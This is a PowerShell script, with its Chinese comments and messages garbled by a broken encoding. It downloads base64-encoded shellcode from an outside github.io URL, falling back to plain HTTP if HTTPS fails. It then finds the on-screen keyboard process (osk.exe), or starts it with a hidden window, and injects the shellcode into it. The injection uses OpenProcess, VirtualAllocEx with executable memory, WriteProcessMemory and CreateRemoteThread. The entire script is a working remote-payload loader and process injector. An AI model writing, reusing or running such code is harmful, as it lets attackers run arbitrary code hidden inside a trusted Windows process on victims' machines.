# �����Ҫ��Windows API�����ͳ�������
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

// Win32 API��������
public class Win32 {
    // �򿪽���API
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    
    // ��Զ�̽����з����ڴ�API
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    // д��Զ�̽����ڴ�API
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
    
    // ����Զ���߳�API
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    // �رվ��API
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
    
    // ��ʾ��Ϣ��API
    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    public static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);
    
    // ��ȡ���������
    [DllImport("kernel32.dll")]
    public static extern uint GetLastError();
    
    // ���̷���Ȩ�޳���
    public const int PROCESS_CREATE_THREAD = 0x0002;
    public const int PROCESS_QUERY_INFORMATION = 0x0400;
    public const int PROCESS_VM_OPERATION = 0x0008;
    public const int PROCESS_VM_WRITE = 0x0020;
    public const int PROCESS_VM_READ = 0x0010;
    
    // �ڴ���䳣��
    public const uint MEM_COMMIT = 0x00001000;
    public const uint MEM_RESERVE = 0x00002000;
    public const uint PAGE_EXECUTE_READWRITE = 0x40;
}
"@

# ȫ�ֱ�������
$shellcodeUrl = "https://me2hk.github.io/"                                                # ���߻�ȡshellcode��URL
$targetProcessName = "osk"                                                                # ע��Ŀ���������
$injectionSuccess = $false                                                                # ע��ɹ���־

# ��ʾ��Ϣ����
function Show-MessageBox {
    param($caption, $text)
    [Win32]::MessageBox([IntPtr]::Zero, $text, $caption, 0) # 0��ʾֻ��ȷ����ť
}

# ���߻�ȡshellcode����
function Download-String {
    param($url)
    try {
        # ʹ��WebClient�����ַ���
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        return $webClient.DownloadString($url)
    }
    catch {
        Write-Host "����ʧ��: $($_.Exception.Message)"

        # ����ʹ�÷�HTTPS����
        if ($url.StartsWith("https://")) {
            $httpUrl = $url.Replace("https://", "http://")
            try {
                $webClient = New-Object System.Net.WebClient
                $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                return $webClient.DownloadString($httpUrl)
            }
            catch {
                # ����ǰ�ȫ����Ҳʧ�ܣ������׳�ԭʼ�쳣
                throw $_.Exception
            }
        }
        throw
    }
}

# ���ݽ�������ȡPID����
function Get-ProcessPidByName {
    param($processName)
    # ȷ��������������.exe��չ��
    if ($processName.EndsWith(".exe")) {
        $processName = $processName.Substring(0, $processName.Length - 4)
    }
    
    # ��ȡָ�����ƵĽ���
    $processes = Get-Process -Name $processName -ErrorAction SilentlyContinue
    Write-Host "�ҵ� $($processes.Count) ����Ϊ '$processName' �Ľ���"
    
    if ($processes) {
        return $processes[0].Id
    }
    return -1
}

# �����������̺���
function Start-ProcessHidden {
    param($processName)
    try {
        # ������������·��
        $systemDir = $env:SystemDirectory
        if ([string]::IsNullOrEmpty($systemDir)) {
            $systemDir = "$env:windir\System32"
        }
        
        $processPath = Join-Path $systemDir $processName
        
        Write-Host "������������: $processPath"
        
        # ����ļ��Ƿ����
        if (-not (Test-Path $processPath)) {
            Write-Host "�����ļ�������: $processPath"
            # ������System32Ŀ¼�в���
            $altPath = "$env:windir\System32\$processName"
            if (Test-Path $altPath) {
                $processPath = $altPath
                Write-Host "�ҵ����·��: $processPath"
            } else {
                Write-Host "�޷��ҵ������ļ�"
                return
            }
        }
        
        # ʹ��Start-Process��������
        $process = Start-Process -FilePath $processPath -WindowStyle Hidden -PassThru
        if ($process) {
            Write-Host "��������������: $processName (PID: $($process.Id))"
            return $process.Id
        } else {
            Write-Host "��������ʧ��: �޷���������"
            return -1
        }
    }
    catch {
        Write-Host "��������ʧ��: $($_.Exception.Message)"
        Write-Host "��������: $($_.Exception.GetType().FullName)"
        if ($_.Exception.InnerException) {
            Write-Host "�ڲ�����: $($_.Exception.InnerException.Message)"
        }
        return -1
    }
}

# ע��shellcode��ָ�����̺���
function Inject {
    param($shellcode, $procPID)
    $procHandle = [IntPtr]::Zero
    $allocMemAddress = [IntPtr]::Zero
    $remoteThread = [IntPtr]::Zero
    $result = -1  # Ĭ��ʧ��

    try {
        # ��Ŀ����̣���ȡ���̾��
        $procHandle = [Win32]::OpenProcess(
            [Win32]::PROCESS_CREATE_THREAD -bor [Win32]::PROCESS_QUERY_INFORMATION -bor 
            [Win32]::PROCESS_VM_OPERATION -bor [Win32]::PROCESS_VM_WRITE -bor [Win32]::PROCESS_VM_READ,
            $false, $procPID
        )

        if ($procHandle -eq [IntPtr]::Zero) {
            $errorCode = [Win32]::GetLastError()
            Write-Host "�򿪽���ʧ�ܣ��������: $errorCode"
            return -1
        }

        Write-Host "�ɹ��򿪽��̣����: $procHandle"

        # ��Ŀ������з����ڴ�
        $allocMemAddress = [Win32]::VirtualAllocEx(
            $procHandle, [IntPtr]::Zero, [System.UInt32]$shellcode.Length,
            [Win32]::MEM_COMMIT -bor [Win32]::MEM_RESERVE, [Win32]::PAGE_EXECUTE_READWRITE
        )

        if ($allocMemAddress -eq [IntPtr]::Zero) {
            $errorCode = [Win32]::GetLastError()
            Write-Host "�����ڴ�ʧ�ܣ��������: $errorCode"
            return -1
        }

        Write-Host "�ɹ������ڴ棬��ַ: $allocMemAddress"

        # ��shellcodeд��Ŀ����̵��ڴ�
        $bytesWritten = [UIntPtr]::Zero
        $writeResult = [Win32]::WriteProcessMemory(
            $procHandle, $allocMemAddress, $shellcode, [System.UInt32]$shellcode.Length, [ref]$bytesWritten
        )

        if (!$writeResult) {
            $errorCode = [Win32]::GetLastError()
            Write-Host "д���ڴ�ʧ�ܣ��������: $errorCode"
            return -1
        }

        Write-Host "�ɹ�д���ڴ棬д���ֽ���: $bytesWritten"

        # ��Ŀ������д���Զ���߳�ִ��shellcode
        $remoteThread = [Win32]::CreateRemoteThread(
            $procHandle, [IntPtr]::Zero, 0, $allocMemAddress, [IntPtr]::Zero, 0, [IntPtr]::Zero
        )

        if ($remoteThread -eq [IntPtr]::Zero) {
            $errorCode = [Win32]::GetLastError()
            Write-Host "����Զ���߳�ʧ�ܣ��������: $errorCode"
            return -1
        }

        Write-Host "�ɹ�����Զ���̣߳��߳̾��: $remoteThread"
        Write-Host "ע�����"
        $result = 0  # �ɹ�
    }
    catch {
        Write-Host "ע������з�������: $($_.Exception.Message)"
        Write-Host "��������: $($_.Exception.GetType().FullName)"
        if ($_.Exception.InnerException) {
            Write-Host "�ڲ�����: $($_.Exception.InnerException.Message)"
        }
        $result = -1
    }
    finally {
        # ������Դ
        if ($procHandle -ne [IntPtr]::Zero) {
            [void][Win32]::CloseHandle($procHandle)
        }
        if ($remoteThread -ne [IntPtr]::Zero) {
            [void][Win32]::CloseHandle($remoteThread)
        }
    }
    
    return $result
}

# ��ִ���߼�
try {
    # ���ð�ȫЭ��ΪTLS 1.2
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

    # ���߻�ȡshellcode��Base64����
    Write-Host "���ڴ� $shellcodeUrl ����shellcode..."
    $base64Shellcode = Download-String $shellcodeUrl
    $shellcode = [Convert]::FromBase64String($base64Shellcode)
    Write-Host "�ɹ����ز�����shellcode������: $($shellcode.Length) �ֽ�"

    # ��ȡosk���̵�PID
    Write-Host "���ڲ��ҽ���: $targetProcessName"
    $targetPid = Get-ProcessPidByName $targetProcessName

    # ���δ�ҵ����̣�������������
    if ($targetPid -eq -1) {
        Write-Host "δ�ҵ� $targetProcessName ���̣�����������..."
        $targetPid = Start-ProcessHidden "osk.exe"
        
        if ($targetPid -eq -1) {
            Write-Host "�޷�����osk����"
            Show-MessageBox "����" "�޷�����Ŀ�����"
            exit
        }
        
        # �ȴ���������
        Start-Sleep -Seconds 2
        Write-Host "���������̣�PID: $targetPid"
    } else {
        Write-Host "�ҵ�Ŀ����̣�PID: $targetPid"
    }

    # ע��shellcode��Ŀ�����
    Write-Host "��ʼע��shellcode������..."
    $result = Inject $shellcode $targetPid
    
    # ����ϸ�ĳɹ��ж�
    if ($result -eq 0) {
        $injectionSuccess = $true
        
        # ��֤ע���Ƿ���ĳɹ� - ���Զ���߳��Ƿ���������
        Start-Sleep -Seconds 1
        
        # ��ʾע�������Ϣ��
        Show-MessageBox "����" ("         ״̬:  ע��ɹ�!`n         ����:  {0}.exe`n         PID:   {1}" -f $targetProcessName, $targetPid)
        Write-Host "ע��ɹ�!"
    }
    else {
        # ע��ʧ��
        Write-Host "ע�����ʧ�ܣ����ش���: $result"
        Show-MessageBox "����" "         ״̬:  ע��ʧ��!"
        Write-Host "ע��ʧ��!"
    }
}
catch {
    # �쳣����
    Write-Host "��������: $($_.Exception.Message)"
    Write-Host "��������: $($_.Exception.GetType().FullName)"
    Write-Host "��ջ����: $($_.ScriptStackTrace)"
    if ($_.Exception.InnerException) {
        Write-Host "�ڲ��쳣: $($_.Exception.InnerException.Message)"
    }

    # ��ʾ������Ϣ��
    Show-MessageBox "����" "����ִ�й����з�������: $($_.Exception.Message)"
}